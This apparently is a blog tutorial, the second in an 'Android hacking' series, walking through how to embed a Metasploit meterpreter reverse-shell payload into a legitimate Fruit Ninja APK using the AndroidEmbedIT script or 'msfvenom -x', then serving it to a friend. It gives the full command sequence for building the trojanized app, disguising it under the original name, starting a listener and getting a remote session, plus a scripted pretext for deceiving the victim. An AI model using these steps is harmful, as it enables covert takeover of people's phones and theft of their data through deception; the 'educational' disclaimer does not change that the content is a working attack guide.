
<a href="https://github.com/vinagrsec">About</a> | <a href="https://vinagrsec.github.io">Posts</a>

<p>Hey everybody, welcome back. Hope you're safe and sound.</p>

<p>In the first part <a href="https://vinagrsec.github.io/android-hacking-part-1">Part-1</a> of the blog, we learned how to create a malicious android application and hack the android phones. We also learned the preventive measures in which how we can restrain ourselves from being a victim.</p>

<p>In this part, we will learn more sophisticated way to create a malicious android application.</p>

<p>So what we are going to do here is, we will embed our malicious android application which we learned to create in Part-1 with legitimate android application. So, let's begin.</p>

<p><h2><strong>Method-1</strong></h2></p>

<p>To embed a malware in legitimate APK, you need to go through several process. Once you create your malicious APK, you need to decompile both malicious and legitimate APKs and inject the code of malicious APK into the legitimate ones. To inject a code in the legitimate android application is a tough task. Even if you're able to inject the code successfully, the APK needs to be properly compiled and signed so that it can execute successfully without any error when the victim uses it in his/her phone.</p>

<p>Going through all these processes manually, is time consuming and there are high chances that we can face issue while embedding the malware in APK.</p>

<p>To avoid such issues, we will be using one nice script named <a href="https://github.com/yoda66/AndroidEmbedIT">AndroidEmbedIT</a> written by yoda66, hosted on Github. According to the script, it performs the following actions to embed a Metasploit generated APK file into another legitimate APK.</p>

<p>• Decompiles a Metasploit APK file, and any other APK file.</p>
<p>• Locates the main Activity entrypoint in the APK being targeted.</p>
<p>• Copies all Metasploit APK staging code to destination APK.</p>
<p>• Adjusts the main Activity entrypoint smali file with an invoke-static call to kick off the Metasploit stage.</p>
<p>• Adjusts the final AndroidManifest.xml with appropriate added permissions.</p>
<p>• Recompiles, and resigns the final APK file.</p>
<br>
<p>Now, it's time to start our game..!!</p>

<p><em><strong>Note:</strong> Before we proceed, please keep in mind that this tutorial/article is just for an educational purpose. This is to make everyone aware about the consequences of using android application from an untrusted/unknown sources.</em></p>
<br>
<p>Like mentioned in previous blog <a href="https://vinagrsec.github.io/android-hacking-part-1">Part-1</a>, I will be performing the whole process in my own network only. But, one can perform the attack process in any network either LAN or WAN (External network).</p>

<p>Before we start getting into the actual process, let's assume one scenario. In this process, 4 actors will be involved:</p>

<p>• Kali Linux Machine (<em><strong>Attacker i.e You</strong></em>)</p>
<p>• Malicious Android Application (<em><strong>APK</strong></em>)</p>
<p>• Legitimate Android Application (<em><strong>APK</strong></em>)</p>
<p>• Android Phone (<em><strong>Victim i.e. Your Friend</strong></em>)</p>

<p>Suppose, a widely used game named Fruit Ninja is removed from the play store. Your friend really loved that game but he is not able to find the game on play store. Now, he approaches you.</p>

<p><em><strong>Friend:</strong> Hey bro, I couldn't find Fruit Ninja on play store. Have they removed it? I really liked that game.</em></p>
<p><em><strong>You:</strong> Yeah bro, they removed it from play store last week but you can get it from the internet.</em></p>
<p><em><strong>Friend:</strong> Bro, can you please download it for me? I'm having internet issues. You can share with me via file-sharing app or any other means.</em></p>
<p><em><strong>You:</strong> Sure, why not..!!</em></p>

<p><img width="279" height="250" src="https://media0.giphy.com/media/8FJjDVGHSOk7PExGeu/giphy.gif?cid=de9bf95eokz160yfe32o7mrzw7ujk1j1swjy8r93z8rmclxs&amp;rid=giphy.gif&amp;ct=g" alt="scheming rooster teeth GIF by Achievement Hunter (GIF Image)"></p>

<p><em><strong>Note:</strong> Assuming attacker(you) and victim(friend) are on the same network here.</em></p>
<br>
<p><strong>Step-1: Creating Malicious Payload</strong></p>

<p>Create a malicious apk using the following command:</p>

<p><strong>#<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;local-ip-address&gt; LPORT=&lt;any unused port&gt; -f raw &gt; malicious-android.apk</code></strong></p>

<img src="https://vinagrsec.files.wordpress.com/2021/10/msfvenom-create-payload.png?w=936" alt="" class="wp-image-129"/>
<br>
<p><strong>Step-2: Download AndroidEmbedIT script from Github</strong></p>

<p>To download the script from github using terminal, you can use git command.</p>

<p><strong>#<code>git clone https://github.com/yoda66/AndroidEmbedIT</code></strong></p>

<img src="https://vinagrsec.files.wordpress.com/2021/10/andrrod-embedit-folder.png?w=837" alt="" class="wp-image-157"/>
<br>
<p>Now, there are some dependencies need to be installed before launching the script. Here is the list and commands to install the dependencies.</p>

<p>• apktool (<strong>#<code>apt install apktool</code></strong>)</p>
<p>• jarsigner (<strong>#<code>apt install openjdk-11-jdk-headless</code></strong>)</p>
<p>• keytool (<em><strong>not required; jarsigner installation is enough</strong></em>)</p>

<p>After installing all these dependencies, you can run the python script. As the script is built in python3, make sure python version 3.x is installed in the system.</p>

<strong>#<code>python3 android_embedit.py -h</code></strong>

<img src="https://vinagrsec.files.wordpress.com/2021/10/embedit-scrpt-help-1.png?w=762" alt="" class="wp-image-131"/>

<p>As you can see from the arguments, script requires key details(not required), a legitimate apk and msf apk (malicious apk).</p>
<br>
<p><strong>Step-3: Embed the Malicious APK code in Legitimate APK</strong></p>

<p>Here, a widely-used android game <strong>Fruit Ninja</strong> apk is downloaded for your friend.</p>

<img src="https://vinagrsec.files.wordpress.com/2021/10/com.fruitninja-android.png?w=723" alt="" class="wp-image-132"/>

<p>Now, we have our both APKs. One is com.fruit-ninja.apk (legitimate application) and the other malicious-android.apk (malicious application).</p>

<p>You can run the python script now.</p>

<strong>#<code>python3 android_embedit.py com.fruit-ninja.apk malicious-android.apk</code></strong>

<img src="https://vinagrsec.files.wordpress.com/2021/10/embedit-successful.png?w=726" alt="" class="wp-image-133"/>

<p>As you can see that the final.apk is created. That means, the apk is properly compiled and signed, hence successfully embedded.</p>

<p>Copy the final.apk to your current folder and rename it with the same legitimate apk name i.e. fruit-ninja.apk.</p>

<strong>#<code>mv final.apk fruit-ninja.apk</code></strong>

<br>
<p><strong>Step-4: Launch Metasploit Framework</strong></p>

<p>Now, launch the metasploit framework using msfconsole. Once the Metasploit framework is launched, you need to use multi/handler, which is a stub that handles exploits launched outside of the framework. Set the same payload, IP address and port which you used while creating the malicious payload in Step-1.</p>

<img src="https://vinagrsec.files.wordpress.com/2021/10/meterprter-exploit-handler.png?w=655" alt="" class="wp-image-140"/>
<br>
<p><strong>Step-5: Host the Latest APK and Share the URL to Your Friend to Download</p></strong>

<p>As learned from the previous blog <a href="https://vinagrsec.github.io/android-hacking-part-1">Part-1</a>, you need to host the latest apk using <strong>SimpleHTTPServer</strong>. Share the URL to your friend, for e.g. http://your-local-ip:8080/fruit-ninja.apk. He will run in his browser's address bar and apk will be downloaded automatically. He can install the application now.</p>

<img src="https://vinagrsec.files.wordpress.com/2021/10/combined-installed-apk-1-2.jpg?w=1024" alt="" data-id="164" data-full-url="https://vinagrsec.files.wordpress.com/2021/10/combined-installed-apk-1-2.jpg" data-link="https://vinagrsec.wordpress.com/combined-installed-apk-1-2/" class="wp-image-164"/></figure></li></ul>

<br>
<p><strong>Step-6: Magic Time!</strong></p>

<p>Let him enjoy his favorite game and **cough**</p>

<img src="https://vinagrsec.files.wordpress.com/2021/10/screenshot_20211023-210514_fruit-ninja-1.jpg?w=576" alt="" class="wp-image-166"/>
<br>
<p>The moment he clicks on the game to play, a magic will happen on the other end and he will be totally unware about what is going on in the background. Wanna see?</p>

<p><em><strong>Et Voilà !</strong></em></p>

<img src="https://vinagrsec.files.wordpress.com/2021/10/meterpreter-sesssion.png?w=940" alt="" class="wp-image-142"/>

<p>Now as learned from the previous blog, type "help" and you can play around and do some stupid stuffs.</p>
<br>
<p><h2><strong>Method-2</strong></h2></p>

<p>Looks pretty cool, right? But, isn't it a bit lengthy process? I mean, you need to download the script from Github. Install the dependencies, blah..blah..blah. Isn't there any easy way, like one-liner something? Definitely, there is. We can use one-liner in-built tool from Kali Linux itself using the same beloved tool <strong>"MsfVenom"</strong>.</p>

<p>Make sure you have the fresh legitimate android application i.e. <strong>Fruit Ninja</strong>.</p>

<p>Now, use the following command and see the magic here.</p>

<strong>#<code>msfvenom -x com.fruit-ninja.apk -p android/meterpreter/reverse_tcp LHOST=&lt;your-local-ip&gt; LPORT=&lt;your-local-port&gt; -f raw &gt; fruit-ninja2.apk</code></strong>

<img src="https://vinagrsec.files.wordpress.com/2021/10/msfvenom-x-1-zipalign-error.png?w=1024" alt="" class="wp-image-148"/>

<p><em>Here, -x denotes template, that means you need to specify a custom executable file to use as a template.</em></p>

<p>When you run the command first time, you may find zipalign error. To resolve this, you need to install zipalign using apt command.</p>

<strong>#<code>apt install zipalign</code></strong>

<img src="https://vinagrsec.files.wordpress.com/2021/10/zipalign-install.png?w=820" alt="" class="wp-image-150"/>

<p>Now, run the msfvenom command again and you can observe from the logs that the procedure is being used here is same as it was in Method-1.</p>

<img src="https://vinagrsec.files.wordpress.com/2021/10/msfvenom-x-2-success.png?w=1024" alt="" class="wp-image-152"/>

<p>From here, follow the Step-4 to 6 and you're good to go. Easy peasy..!!</p>
<br>
<p>Well, that's all I had to show you for now. Hope you find this blog interesting and insightful. Please drop your comments in case of any issues. I will be back with more interesting hacking stuffs. Till then, take care. Stay tuned..!!</p>
<br>
<p><strong>References</strong></p>

<p>• https://www.offensive-security.com/metasploit-unleashed/</p>
<p>• https://github.com/yoda66/AndroidEmbedIT</p>

<br>
<script src="https://utteranc.es/client.js"
        repo="vinagrsec/android-hacking-part-1"
        issue-term="pathname"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>


